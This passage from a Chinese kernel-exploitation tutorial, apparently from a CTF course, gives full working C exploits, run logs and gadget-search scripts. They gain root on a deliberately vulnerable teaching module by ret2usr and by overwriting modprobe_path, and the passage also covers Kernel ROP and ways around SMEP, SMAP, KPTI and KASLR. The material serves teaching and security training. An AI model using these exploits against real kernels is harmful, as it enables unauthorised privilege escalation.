    *(unsigned long *)(payload + OFFSET) = (unsigned long)escalate;

    fd = open("/dev/vulndev", O_RDONLY);
    if (fd < 0) {
        perror("[-] open /dev/vulndev");
        return 1;
    }
    printf("[*] read %zu bytes into /dev/vulndev\n", sizeof(payload));
    read(fd, payload, sizeof(payload));

    printf("[-] read returned without hijack?\n");
    return 0;
}
```

执行序列对一遍：`read` 触发 `vuln_read`，96 字节填充加 8 字节 `escalate` 地址顺着 `kbuf → 保存的 rbp → 返回地址`压过去；尾声的 ret 把 `escalate` 弹进 rip，CPU 带着内核态段寄存器落到用户页上的提权代码；`commit_creds` 生效后 `swapgs; iretq` 按 5 连槽落回 `win_land`，`execve` 换壳成 root shell。

> [!info]- 对齐问题真的会咬人：一次真实的 GPF
> 帧里的 rsp 不拨对齐时的结局可以精确复现：win_land 的反汇编里有一条 `movaps XMMWORD PTR [rsp+0x10],xmm0`——
>
> ```asm
> ; x86-64 Linux（exp_ret2usr 静态编译，win_land 开头几条）
> 401dd0:  endbr64
> 401dd4:  push   rbp
> 401dd5:  push   rbx
> 401dd6:  lea    rbx,[rip+0xac274]
> 401ddd:  movq   xmm0,rbx
> 401de2:  sub    rsp,0x28
> 401de6:  movaps XMMWORD PTR [rsp+0x10],xmm0     ; 落点差 8 字节时这里 GPF
> ```
>
> 内核侧对应的报错是进程级的一般保护错：`traps: exp_ret2usr[95] general protection fault ip:401de6 ... in exp_ret2usr`——[[P06-栈溢出原理与ret2win#5. 栈 16 字节对齐与 movaps 崩溃|P6 第 5 节]]"差 8 必撞"的结论原样成立，只是这次撞的位置从 libc 的 do_system 换成了自己的函数开头。

### 5.3 完整运行：从 Permission denied 到 root shell

教学 init 已把 flag 权限设为 600、并以 uid 1000 身份进入演示目录，利用前后各看一眼：

```
/home/ctf $ id
uid=1000(ctf) gid=1000(ctf)
/home/ctf $ cat /flag.txt
cat: can't open '/flag.txt': Permission denied
/home/ctf $ ./exp_ret2usr
[*] commit_creds        @ 0xffffffff8148a7e0
[*] prepare_kernel_cred @ 0xffffffff8148ae30
[*] init_task           @ 0xffffffff83a134c0
[*] read 104 bytes into /dev/vulndev
[   72.168074] vulndev: read called, count=104
[   72.168147] vulndev: read done, kbuf[0]=41
[+] back in userland: uid=0 gid=0


BusyBox v1.37.0 (Ubuntu 1:1.37.0-7ubuntu1) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/home/ctf # id
uid=0(root) gid=0(root)
/home/ctf # cat /flag.txt
flag{p18_kernel_pwn_first_blood}
```

从 `uid=1000` 到 `uid=0`，一个 kernel pwn 完整落地。两条内核日志夹在 exploit 输出中间（`read called`/`read done` 是模块自己的 `pr_info`），恰好标出了内核态执行的那一小段窗口。==一次基础的 kernel pwn = 环境搭建（第 2–3 节）+ 漏洞模块（第 4 节）+ cred 提权与 ret2usr（本节）==，剩下两件事（SMEP 之后的路、无函数调用的打法）都是在这个骨架上换零件。

### 5.4 SMEP 开启：同一个 payload 的失败现场

把启动命令里的 CPU 改成 `-cpu qemu64,+smep,+smap`（==SMEP/SMAP 是 CPU 特性，由 qemu 的型号开关控制==），其余一字不动，重打：

```
/home/ctf $ ./exp_ret2usr
[*] commit_creds        @ 0xffffffff8148a7e0
[   54.202634] vulndev: read done, kbuf[0]=41
[   54.202986] unable to execute userspace code (SMEP?) (uid: 1000)
[   54.203286] BUG: unable to handle page fault for address: 0000000000401cf0
[   54.203366] #PF: supervisor instruction fetch in kernel mode
[   54.203419] #PF: error_code(0x0011) - permissions violation
[   54.203733] Oops: Oops: 0011 [#1] SMP NOPTI
[   54.204047] CPU: 0 UID: 1000 PID: 85 Comm: exp_ret2usr Tainted: G           OE       7.0.0-38-generic #38-Ubuntu PREEMPT(lazy) 
[   54.204519] RIP: 0010:0x401cf0
[   54.204806] Code: Unable to access opcode bytes at 0x401cc6.
[   54.207832] CR2: 0000000000401cf0 CR3: 00000000068d9000 CR4: 00000000003006f0
Killed
```

逐行判读，每一行都在复述同一个事实：

- `unable to execute userspace code (SMEP?)`——内核自己把死因写在了第一行；
- `#PF: supervisor instruction fetch in kernel mode`——取指方是内核态（supervisor），取的是用户页上的指令：==ret 已经把控制流送到了 0x401cf0（escalate 的地址），CPU 在取指阶段拒绝了它==；
- `CR2: 0000000000401cf0` 与 `RIP: 0010:0x401cf0`（CS 为 0010，内核段）——目标地址就是 exploit 的用户态函数；
- `CR4: 00000000003006f0`——对比 5.3 正常运行时的 `00000000000006f0`，多出的 `0x300000` 正是 SMEP（bit 20）与 SMAP（bit 21）两位；
- `Killed`——oops 杀掉了 exploit 线程，shell 还在（机器没死，4.1 说的 oops 与 panic 的区别）。

==SMEP 封掉的是"ret2usr"这四个字母里的 usr==：内核态不能执行用户页。漏洞还在、返回地址还在手里，只是跳转目标必须换成==内核自己的代码==——这就是 Kernel ROP，第 6 节。

### 5.5 /proc/kallsyms：符号对账

5.2 的 exploit 从 `/proc/kallsyms` 读符号。在虚拟机的 root shell 里直接查，与宿主机 System.map（2.3）对一次账：

```
~ # grep -E ' (commit_creds|prepare_kernel_cred|init_task|modprobe_path)$' /proc/kallsyms
ffffffff8148a7e0 T commit_creds
ffffffff8148ae30 T prepare_kernel_cred
ffffffff83a134c0 T init_task
ffffffff83c20560 T modprobe_path
```

四个值与 2.3 的 System.map 逐位一致——`nokaslr` 之下内核每次装载在同一段基址上，文件里的静态地址就是运行期地址。教学 init 放开的两个开关在这条路上缺一不可，默认值下普通用户只能读到全 0。

> [!info]- kptr_restrict 与 perf_event_paranoid：普通用户读符号的两道闸
> `/proc/kallsyms` 是否对普通用户显示真实地址，由内核函数 `kallsyms_show_value` 决定，规则可概括为：`kptr_restrict=0` 时还要求 `perf_event_paranoid <= 1` 才放行；`kptr_restrict=1` 只对持 CAP_SYSLOG 的进程显示；更大值一律隐藏。Ubuntu 的默认配置（`/usr/lib/sysctl.d/55-kernel-hardening.conf`）是 `kptr_restrict=1` 加 `perf_event_paranoid=4`，双闸全关——这就是真题里"普通用户读 kallsyms 全是 0"的原因，也是内核题必须先泄露符号（或按附件静态分析）的原因。教学 init 把两者放开，只为让 5.2 的 exploit 自包含。

## 6. Kernel ROP：SMEP 开启后的路

### 6.1 思路：把"跳用户态"换成"串内核自己的代码"

SMEP 之后的目标与 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]] 的 ret2libc 同构：==泄露内核基址，在内核代码段里搜 gadget，拼链调 `commit_creds`==。异同放一张表：

| | 用户态 ROP（[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]]、[[P08-ROP进阶与SROP\|P8]]） | Kernel ROP |
| ---- | ---- | ---- |
| gadget 仓库 | 程序自身、libc | vmlinux 全部内核代码（十几 MB 起步，海量） |
| 目标函数 | `system("/bin/sh")` | `commit_creds(&init_cred)` 等提权调用 |
| 符号与基址 | libc 基址靠泄露，低 12 位不变（[[P03-ELF链接与延迟绑定\|P3]]） | 内核基址靠泄露，`nokaslr` 时基址固定（本机情形） |
| 溢出的栈 | 用户栈（8 MB） | 内核栈（==16 KiB==，链长要省着用） |
| 链的收尾 | 到 `system` 为止，后事不用管 | 还要==干净地回用户态==，否则提权了也没 shell |
| 额外对手 | NX/Canary/PIE/RELRO | SMEP/SMAP/KPTI（第 7 节） |

最短的链不需要 `prepare_kernel_cred`（它返回的 `cred` 在 rax 里，还要多找一条"把 rax 搬进 rdi"的片段）——直接用 5.1 预告的变体，`rdi` 一步到位：

```asm
; Kernel ROP 链草图（x86-64 Linux，内核栈上）
;   [96 字节填充          ]   填满 kbuf 区与保存的 rbp
;   [pop rdi ; ret 的地址 ]   ← vuln_read 的 ret 落在这里
;   [&init_cred           ]   ← pop rdi 弹进 rdi
;   [commit_creds 的地址  ]   ← 上格的 ret 落进去：当前线程凭据已是 root
;   [回用户态的收尾（见 6.3）]
```

### 6.2 在 vmlinux 上搜 gadget

内核代码量大，`ROPgadget --binary vmlinux` 的全量反汇编扫描要等很久；做题常用的快路是==按字节模式直接搜==——gadget 本质是字节序列，`pop rdi ; ret` 就是 `5f c3` 两个字节（[[P08-ROP进阶与SROP#2. gadget 筛选与组合|P8 第 2 节]]的 `--opcode` 同一思路）。解析 vmlinux 的可执行段、按虚拟地址报告命中：

```python
#!/usr/bin/env python3
# find_gadgets.py —— 在 vmlinux 的可执行段里按字节模式搜 gadget
import struct, sys

data = open(sys.argv[1], 'rb').read()
e_phoff = struct.unpack_from('<Q', data, 0x20)[0]
e_phentsize = struct.unpack_from('<H', data, 0x36)[0]
e_phnum = struct.unpack_from('<H', data, 0x38)[0]
segs = []
for i in range(e_phnum):
    off = e_phoff + i * e_phentsize
    p_type, p_flags = struct.unpack_from('<II', data, off)
    p_offset, p_vaddr, _pa, p_filesz, _mem = struct.unpack_from('<QQQQQ', data, off + 8)
    if p_type == 1 and (p_flags & 1):        # PT_LOAD 且可执行
        segs.append((p_offset, p_vaddr, p_filesz))

for name, pat in [('pop rdi ; ret', b'\x5f\xc3'),
                  ('pop rsi ; ret', b'\x5e\xc3'),
                  ('pop rax ; ret', b'\x58\xc3')]:
    hits = []
    for off, vaddr, filesz in segs:
        seg = data[off:off + filesz]
        pos = 0
        while len(hits) < 3:
            pos = seg.find(pat, pos)
            if pos < 0:
                break
            hits.append(vaddr + pos)
            pos += 1
        if len(hits) >= 3:
            break
    print('%-16s %s' % (name, '  '.join('0x%x' % h for h in hits)))
```

```bash
python3 find_gadgets.py vmlinux
```

输出：

```
pop rdi ; ret    0xffffffff812a7b9d  0xffffffff812d4b23  0xffffffff812d9d2f
pop rsi ; ret    0xffffffff8123d5ba  0xffffffff8142a7c8  0xffffffff8142a7cf
pop rax ; ret    0xffffffff8120c384  0xffffffff8142ae50  0xffffffff8142ae89
```

字节搜索的落点可能在某条更长指令的中间，与用户态搜索一样要==反汇编核对==再用：

```bash
objdump -d -M intel --start-address=0xffffffff812a7b9d --stop-address=0xffffffff812a7b9f vmlinux
```

输出：

```
ffffffff812a7b9d:	5f                   	pop    rdi
ffffffff812a7b9e:	c3                   	ret
```

> [!warning] 内核里的"纯 ret"比用户态稀少
> 开了 retpoline/retbleed 缓解的内核，函数收尾大量使用"跳转到返回桩"替代裸 `ret`（4.3 反汇编尾部那条 `jmp` 就是），`mov rdi, rax ; ret` 这类以裸 `ret` 结尾的形状在本机内核里一条都搜不到。实际拼链时放宽要求：搜 `5f c3` 的短形状、跨指令重叠的落点，或直接用 `ROPgadget`/`ropper` 全量扫（时间换覆盖）；搜不到的搬运片段用等价组合替代——6.1 的链绕开了 `rdi ← rax` 搬运，正是这个原因。

### 6.3 链的收尾：回到用户态

用户态 ROP 的链到 `system("/bin/sh")` 就结束了；内核链在 `commit_creds` 之后还要把控制流==干净地送回用户态自己的 shell==——直接 `iretq` 在 KPTI 开启的内核上不可行（内核页表此刻不含用户映射，第 7 节），标准收尾是借内核自己的"返回用户态"路径：符号 `swapgs_restore_regs_and_return_to_usermode`。它开头是一长串恢复寄存器的 `pop`，链要跳过它们、从能用的位置切入。用 System.map 拿地址、objdump 看形状：

```bash
grep -w swapgs_restore_regs_and_return_to_usermode /boot/System.map-7.0.0-38-generic
objdump -d -M intel --start-address=0xffffffff81001194 --stop-address=0xffffffff810011c4 vmlinux
```

输出：

```
ffffffff81001170 T swapgs_restore_regs_and_return_to_usermode
```

```asm
; x86-64 Linux（vmlinux，返回用户态路径的入口段）
ffffffff81001194:	41 5f                	pop    r15
ffffffff81001196:	41 5e                	pop    r14
ffffffff81001198:	41 5d                	pop    r13
ffffffff8100119a:	41 5c                	pop    r12
ffffffff8100119c:	5d                   	pop    rbp
ffffffff8100119d:	5b                   	pop    rbx
ffffffff8100119e:	41 5b                	pop    r11
ffffffff810011a0:	41 5a                	pop    r10
ffffffff810011a2:	41 59                	pop    r9
ffffffff810011a4:	41 58                	pop    r8
ffffffff810011a6:	58                   	pop    rax
ffffffff810011a7:	59                   	pop    rcx
ffffffff810011a9:	5e                   	pop    rsi
ffffffff810011aa:	5f                   	pop    rdi
ffffffff810011ab:	48 83 c4 08          	add    rsp,0x8
ffffffff810011af:	0f 01 f8             	swapgs
ffffffff810011b9:	f6 44 24 08 03       	test   BYTE PTR [rsp+0x8],0x3
ffffffff810011be:	0f 85 9d 00 00 00    	jne    0xffffffff81001261
```

==pop 链到哪一格结束、`swapgs` 与后续返回路径从哪开始，每颗内核都要现场反汇编量==（本机是 `add rsp,0x8` 之后的 `swapgs` 段；不同内核入口偏移不同，网上资料给的"+14/+22"不可照抄）。拼好的链在 `commit_creds` 之后落进蹦床的切入点，栈上再按该入口的期待摆好伪造的 iret 帧（rip 指用户态 shell、cs/rflags/rsp/ss 按 5.2 同样备好），内核自己完成 `swapgs` 与页表切换。本节给出的是路线与原料；完整拼一遍放到做完 5.3 的练习之后，用它把 5.4 的 SMEP 环境打穿，是入门阶段最好的一道练习。

> [!info]- 内核基址怎么泄露
> KASLR 开启时链上所有内核地址都要"基址 + 偏移"。内核态泄露的常见渠道：模块自身带回的内核指针（如 `seq_file`/`single_open` 造成的栈上残留）、侧信道（如 prefetch 类）、以及部分信息文件（`/proc/*/stat`、dmesg 中残留地址等，取决于内核配置）。方向与用户态一致：==先制造一次泄露，再拼第二轮利用==；`nokaslr` 的教学环境里此步整体免掉。

## 7. KASLR / SMEP / SMAP / KPTI：内核侧的缓解清单

[[P04-Linux安全缓解机制|P4]] 讲过用户态四件套（NX/Canary/ASLR/PIE）的原理与绕过；内核作为"被打的对象"还有一组自己的机制，逐项过一遍"防什么、怎么开、绕过方向"：

| 机制 | 防什么 | 怎么开 | 绕过方向 |
| ---- | ---- | ---- | ---- |
| KASLR | 内核基址随机化，链上的符号地址写死即失效 | 内核配置 `CONFIG_RANDOMIZE_BASE`（发行版默认开） | 泄露一个内核指针推基址；`nokaslr` 时不设防（教学环境） |
| SMEP | 内核态执行用户页代码——ret2usr 直接被取指拒绝 | CPU 特性，`-cpu 型号,+smep`；真机在 CPU 里 | ==Kernel ROP==：跳转目标换成内核代码（第 6 节） |
| SMAP | 内核态读写用户页数据——链上的用户态数据够不着 | CPU 特性，`-cpu 型号,+smap` | 数据全部搬进内核可写页（把 payload/伪结构拷进内核再执行） |
| KPTI | 内核页表不再映射用户空间——用户态代码/数据在内核态不可见，裸 `iretq` 回不去 | 内核配置 + cmdline（`nopti` 关闭；本机 `CONFIG_MITIGATION_PAGE_TABLE_ISOLATION=y`） | 借内核自己的返回路径收尾：`swapgs_restore_regs_and_return_to_usermode`（6.3） |

与用户态机制一张对照表收尾——注意两栏的对应关系不是同名对应，而是"拦同一种动作"：

| 用户态机制（[[P04-Linux安全缓解机制\|P4]]） | 内核态对应 | 共同拦的动作 |
| ---- | ---- | ---- |
| ASLR | KASLR | 写死基址的 payload 失效 |
| NX / DEP | SMEP | 数据页（用户页）上执行代码 |
| —— | SMAP | 内核态读写用户数据（用户态无此角色，内核有） |
| —— | KPTI | 两套地址空间的隔离（用户态无此角色） |
| Stack Canary | 内核栈保护（`CONFIG_STACKPROTECTOR`） | 溢出碾过哨兵值 |
| PIE + ASLR | KASLR | 同上 ASLR 行 |

> [!note] 教学环境的设定与真题的差距
> 本章 cmdline 的 `nokaslr nopti` 与 `-cpu qemu64`（无 SMEP/SMAP）是==刻意全关==的教学设定，让 ret2usr 这条最容易理解的路先走通。真题默认全部开启，策略按第 7 节的"绕过方向"一列组合：KASLR 要泄露、SMEP 要 Kernel ROP、KPTI 要借蹦床收尾、SMAP 要搬数据。看到附件 run.sh 里出现 `+smep`、`kpti=1` 或 cmdline 里没有 `nopti`，先按这张表把可用路线筛一遍再动手。

## 8. modprobe_path 覆盖：不调用内核函数的提权

### 8.1 原理与适用条件

内核偶尔要替用户跑一个==root 权限的辅助程序==：可执行格式未知时内核发一次模块加载请求（`request_module`），请求最终由 `call_usermodehelper` 执行——跑的路径存在全局变量 ==`modprobe_path`== 里，默认 `"/sbin/modprobe"`。它躺在内核可写数据段，==一个 8 字节写就能换掉==；换掉之后，下一次触发模块请求，内核就以 root 身份执行攻击者指定的程序。

与 5.1 的 cred 路线相比，它==不需要调用任何内核函数==：`commit_creds` 那条链要拿函数地址、按调用约定装参数，在 SMEP/SMAP/KPTI 全开、只剩"一次任意写"的题目里，modprobe_path 是标准答案。提权动作也不发生在 exploit 进程里——exploit 只改字符串，改完回用户态继续当普通用户，等内核稍后自己把脚本跑起来。

==适用条件==两条：一是有任意写原语（本章借 5.2 的 ret2usr 执行一次 `memcpy`，真题常见的是内核 ROP 里的写 gadget）；二是知道 `modprobe_path` 的地址（`nokaslr` 直接从 System.map 读；KASLR 开启时同样需要先拿内核基址——"无泄露"的准确边界见折叠框）。

> [!info]- "无 leak 场景"的准确含义
> modprobe_path 打法常被称作"无泄露提权"，指的是==不需要泄露内核函数地址、不需要执行内核代码==，一次数据写就完成布局；但 `modprobe_path` 本身的地址在 KASLR 下依然未知——所以严格的说法是：==有一个写原语 + 一个内核数据符号地址==。基址可从侧信道、局部泄露或题目残留的 `nokaslr` 获得。真正全程零泄露的场合只有 `nokaslr` 或内核未开 KASLR 的环境。

### 8.2 exploit 与触发器

exploit 与 5.2 只差一个内核态动作：把 `"/tmp/w"` 连同结尾的 `\0` 写进 `modprobe_path`，然后照常 `swapgs; iretq` 回用户态——不提权、不换壳。

```c
/* exp_modprobe.c —— modprobe_path 覆盖提权演示（x86-64 Linux）
 * 前提与 exp_ret2usr 相同；这次不改 cred，只改一个内核字符串。 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define OFFSET 96            /* kbuf 在 rbp-0x58，到返回地址 0x60 = 96 字节 */

static unsigned long user_cs, user_ss, user_rflags, user_sp;
static unsigned long modprobe_path_addr;
static const char newpath[] = "/tmp/w";

static unsigned long iret_frame[5];

static void save_state(void)
{
    __asm__ __volatile__(
        "movq %%cs,  %0\n\t"
        "movq %%ss,  %1\n\t"
        "pushfq\n\t"
        "popq  %2\n\t"
        "movq %%rsp, %3\n\t"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory");
}

/* 回到用户态后的落点：改写已完成，本进程仍是普通用户——提权动作
 * 发生在内核稍后的 usermodehelper 里 */
static void win_land(void)
{
    printf("[+] back in userland, modprobe_path overwritten\n");
    exit(0);
}

/* 在 ring0 执行的改写动作：8 字节连结尾的 \0 一起写进 modprobe_path */
static void overwrite(void)
{
    memcpy((void *)modprobe_path_addr, newpath, sizeof(newpath));
    __asm__ __volatile__(
        "swapgs\n\t"
        "movq %0, %%rsp\n\t"
        "iretq\n\t"
        :
        : "r"(iret_frame)
        : "memory");
    for (;;)
        ;
}

/* ksym() 与 exp_ret2usr 相同：从 /proc/kallsyms 读符号地址 */
static unsigned long ksym(const char *name)
{
    FILE *fp;
    char line[512], sym[128], type;
    unsigned long addr = 0;

    fp = fopen("/proc/kallsyms", "r");
    if (!fp) {
        perror("[-] open /proc/kallsyms");
        exit(1);
    }
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%lx %c %127s", &addr, &type, sym) == 3 &&
            strcmp(sym, name) == 0)
            break;
    }
    fclose(fp);
    return addr;
}

int main(void)
{
    unsigned char payload[OFFSET + 8];
    char buf[128];
    FILE *fp;
    int fd, n;

    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();

    modprobe_path_addr = ksym("modprobe_path");
    printf("[*] modprobe_path @ 0x%lx\n", modprobe_path_addr);

    /* 覆盖前的现值，普通用户也读得到 */
    fp = fopen("/proc/sys/kernel/modprobe", "r");
    n = fp ? (int)fread(buf, 1, sizeof(buf) - 1, fp) : 0;
    if (fp) fclose(fp);
    if (n > 0) {
        buf[n] = 0;
        printf("[*] current modprobe_path value: %s", buf);
    }

    iret_frame[0] = (unsigned long)win_land;
    iret_frame[1] = user_cs;
    iret_frame[2] = user_rflags;
    iret_frame[3] = (user_sp & ~0xfUL) - 8;
    iret_frame[4] = user_ss;

    memset(payload, 'A', sizeof(payload));
    *(unsigned long *)(payload + OFFSET) = (unsigned long)overwrite;

    fd = open("/dev/vulndev", O_RDONLY);
    if (fd < 0) {
        perror("[-] open /dev/vulndev");
        return 1;
    }
    printf("[*] read %zu bytes into /dev/vulndev\n", sizeof(payload));
    read(fd, payload, sizeof(payload));

    printf("[-] read returned without hijack?\n");
    return 0;
}
```

剩下的问题是==怎么让内核发一次模块请求==。老教材的触发器是执行一个 4 字节 `\xff\xff\xff\xff` 的假可执行文件：所有已注册的可执行格式都不认，内核发 `binfmt-%04x` 请求去补加载。==这条路在新内核里已经没有了==——本机内核的 vmlinux 里搜不到 `binfmt-%04x` 字符串（上游近年移除了 execve 路径的模块自动加载）。替代触发器仍是同一类机制，只是换个请求来源：`socket()` 一个内核里没有对应实现的协议族，`__sock_create` 会发 `net-pf-<编号>` 请求。本机内核把 `AF_APPLETALK`（协议族 5）编成了模块而环境里一个模块都没装：

```c
/* trigger.c —— 以普通用户身份触发一次内核的模块自动加载请求 */
#include <stdio.h>
#include <sys/socket.h>

int main(void)
{
    int fd = socket(AF_APPLETALK, SOCK_DGRAM, 0);
    printf("[*] socket(AF_APPLETALK) = %d — request_module fired\n", fd);
    return 0;
}
```

准备一个内容任意的辅助脚本 `/tmp/w`（它将被内核以 root 身份执行），覆盖后触发：

```sh
printf '#!/bin/sh\ncat /flag.txt > /tmp/pwned.txt\nchmod 666 /tmp/pwned.txt\n' > /tmp/w
chmod 755 /tmp/w
```

### 8.3 完整运行

全程 uid 1000：

```
/home/ctf $ printf "#!/bin/sh\ncat /flag.txt > /tmp/pwned.txt\nchmod 666 /tmp/pwned.txt\n" > /tmp/w; chmod 755 /tmp/w
/home/ctf $ ./exp_modprobe
[*] modprobe_path @ 0xffffffff83c20560
[*] current modprobe_path value: /sbin/modprobe
[*] read 104 bytes into /dev/vulndev
[+] back in userland, modprobe_path overwritten[   84.912700] vulndev: read called, count=104
[   84.912816] vulndev: read done, kbuf[0]=41

/home/ctf $ ./trigger
[*] socket(AF_APPLETALK) = -1 — request_module fired
/home/ctf $ cat /tmp/pwned.txt
flag{p18_kernel_pwn_first_blood}
/home/ctf $ cat /proc/sys/kernel/modprobe
/tmp/w
```

对账三处：`modprobe_path` 的地址与 5.5 的 kallsyms 一致；覆盖前现值 `/sbin/modprobe`、覆盖后 `/proc/sys/kernel/modprobe` 变成 `/tmp/w`（这个 proc 文件读的就是那个全局变量）；exploit 自己全程 uid 1000，flag 是被内核以 root 身份执行的 `/tmp/w` 抄进 `/tmp/pwned.txt` 的——`chmod 666` 之后普通用户可读。==漏洞只提供"写"，提权由内核自己完成==，这就是这条路线的全部巧处。

## 9. seccomp 在 kernel 题里管什么

真题镜像常在漏洞进程上装 seccomp 过滤器，而且==拦的常常不是提权、而是提权之后的行为==：filter 只放行少量 syscall，拿到 root shell 后 `open`/`read` flag 的那两个调用照样被拦。对应解法一句话：==把读 flag 的动作搬进内核态做==——Kernel ROP 在内核里调 `run_cmd` 一类现成的"以 root 跑一条命令"函数，或直接调用内核读文件的路径，绕开用户态过滤器。判定方法也简单：提权成功但 shell 里读 flag 无声无息地失败，先怀疑 seccomp。

## 10. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| insmod 报 `Invalid module format` | 模块与内核版本不同源：vermagic 不一致（4.1）。头文件与 bzImage 必须来自同一版本的包 |
| insmod 报 `Required key not available` | 内核开了强制模块签名：换关签名的内核，或按附件提供的方式签名 |
| `copy_from_user` 触发 `kernel BUG at mm/usercopy.c` | hardened usercopy 拦下成块越界拷贝（4.2）：改逐字节 `get_user` 循环 |
| exploit 打过去毫无反应，反汇编循环里连写缓冲区的指令都没有 | 优化器把"只写不读"的缓冲区连同漏洞一起消除了（4.2）：循环放进 `noinline` 辅助函数，事后读一格保活 |
| 触发时 `#PF ... not-present page`，RIP 在搬运循环里 | count 开太大写穿了 16 KiB 内核栈（4.4 的 warning）：溢出长度精确控制在返回地址槽附近 |
| ret2usr 回用户态后 GPF 在自己函数的 movaps | iretq 帧的 rsp 没按函数入口约定对齐：帧内 rsp 拨到 ≡8 mod 16（5.2） |
| SMEP 环境下报 `unable to execute userspace code (SMEP?)` | ret2usr 被取指拒绝（5.4）：转 Kernel ROP（第 6 节） |
| exploit 里 kallsyms 读出来全是 0 | `kptr_restrict`/`perf_event_paranoid` 默认配置对普通用户隐藏地址（5.5 折叠框）：按附件 System.map 写死，或 root 读一次 |
| 新内核上 4 字节假 ELF 触发不了 modprobe | execve 路径的 binfmt 自动加载已被移除（8.2）：改用 `socket(未实现协议族)` 触发 `net-pf-N` 请求 |
| rootfs 里 `/tmp` 写不进、`mkdir` 失败 | 打包时 `/tmp` 权限没放开：`chmod 1777`（3.1） |
| qemu 报 `failed to initialize kvm` | 环境没有 `/dev/kvm`：去掉 `-enable-kvm` 用纯模拟，照常能跑（3.2 折叠框） |
| uid 1000 下 `poweroff` 报 `Operation not permitted` | 关机是 root 的活：回 root shell 再关，或让 init 脚本收尾 |
| Kernel ROP 链执行后 panic 而不是回用户态 | 收尾没走内核自己的返回路径：`swapgs_restore_regs_and_return_to_usermode` 的切入偏移要按本内核反汇编现场量（6.3） |

## 11. 配套练习与延伸阅读

> [!note] 实战任务
> 按本章流程完整复现一遍，再向真题推进半步：
> 1. 把 5.3 的环境原样搭一遍（bzImage、rootfs、模块、exploit 全部自己生成），确认 ret2usr 拿到 root；
> 2. 在 5.4 的 SMEP 环境里，用 6.1–6.3 的路线把 `commit_creds(&init_cred)` 链完整拼出来，收尾借 `swapgs_restore_regs_and_return_to_usermode` 回用户态拿 shell——这一步做完，Kernel ROP 的基本功就齐了；
> 3. 做 1–2 道公开的 kernel pwn 入门题。经典起点是 CISCN 2017 的 babydriver（UAF 形态，附件 bzImage/rootfs 公开可查，Buuoj 等国内靶场有复刻）；英文环境的系统化路径推荐 pwn.college 的 kernel security 模块。做题时把本章第 7 节的缓解清单先填一遍再动手；UAF 一族的完整解法（SLUB 对象生命周期、堆喷、泄露与劫持）在 [[P19-内核堆利用与UAF|P19]] 展开。

延伸阅读按需取用：内核源码 `Documentation/`（驱动模型与 `file_operations` 的权威描述）、LWN 上关于 usermodehelper 与 KPTI 的文章、`scripts/extract-vmlinux` 与内核 Kconfig（本章各机制的配置出处）。工具侧，`vmlinux-to-elf` 能从无符号 bzImage 恢复带符号的 vmlinux，`ropper` 与 ROPgadget 同类可换着用。打综合赛程里的内核题与更多平台差异，[[P20-多平台PWN|P20]]；赛事节奏与 AI 辅助实战，[[P22-综合实战赛事策略与AI辅助|P22]]。
